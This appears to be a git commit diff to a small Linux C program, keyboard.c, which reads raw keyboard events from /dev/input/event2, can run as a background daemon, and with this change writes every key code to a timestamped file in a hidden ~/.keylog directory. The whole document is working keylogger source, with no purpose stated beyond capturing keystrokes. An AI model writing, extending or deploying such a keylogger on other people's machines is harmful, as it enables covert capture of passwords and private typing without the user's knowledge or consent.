5de6f955f4e8cbe34462bb911931b64468197990
wang lei <398758695@qq.com>
2016-07-27 15:20:41 +0800

    save to file

--- keyboard.c
+++ keyboard.c
@@ -1,6 +1,8 @@
+#include<string.h>
 #include<stdio.h>
 #include<stdlib.h>
 #include<unistd.h>
+#include<time.h>
 #include<linux/input.h>
 #include<fcntl.h>
 /*
@@ -20,10 +22,24 @@ void daemon()
 */
 int main(int argc,char ** argv)
 {
-    int fd;
+    int fd,sfd = -1;
     char ch;
     struct input_event kevent;
+    char filepath[40];
+    char buff[10];
     char *usage = "usage\n\t-b : run in background\n\t-f : output to a file\n";
+
+    /*get thr system time as path */
+    time_t now;
+    struct tm *tm_now;
+ 
+    time(&now);
+    tm_now = localtime(&now);
+ 
+    sprintf(filepath,"/home/alis/.keylog/%d-%d-%d-%d:%d:%d", tm_now->tm_year, tm_now->tm_mon, tm_now->tm_mday, tm_now->tm_hour, tm_now->tm_min, tm_now->tm_sec);
+
+
+
     if((fd=open("/dev/input/event2",O_RDONLY))==-1)
     {
         printf("usage: you must be root!\n");
@@ -36,7 +52,7 @@ int main(int argc,char ** argv)
      *c 后跟两个冒号，表示有一个可选的参数 
      *
      */ 
-    while( ( ch = getopt( argc, argv, "hbf:" ) ) != EOF ) 
+    while( ( ch = getopt( argc, argv, "hbf" ) ) != EOF ) 
     {
         //test for getopt
         switch(ch) 
@@ -49,8 +65,11 @@ int main(int argc,char ** argv)
                 daemon(0,0);
                 break;
             case 'f':
-                printf("the arg is %s\n",optarg);
-                break;
+               sfd=open(filepath,O_WRONLY|O_CREAT|O_APPEND,0444);
+               if(sfd==-1)
+                    exit(1);
+                printf("the arg is %s\n",filepath);
+               break;
             default:
                 break;
 
@@ -67,8 +86,12 @@ int main(int argc,char ** argv)
         {
             if(read(fd,&kevent,sizeof(kevent)) == sizeof(kevent))
                {
-                   if(kevent.type==EV_KEY)
-                   printf("type:%u \t code:%u \t value%d \n",kevent.type,kevent.code,kevent.value);
+                   if(kevent.type==EV_KEY && sfd!=-1)
+                   {
+                       sprintf(buff,"%u-%d\n",kevent.code,kevent.value);
+                       //printf("type:%u \t code:%u \t value%d \n",kevent.type,kevent.code,kevent.value);
+                       write(sfd,buff,strlen(buff));
+                   }
                } 
         }
     return 0;
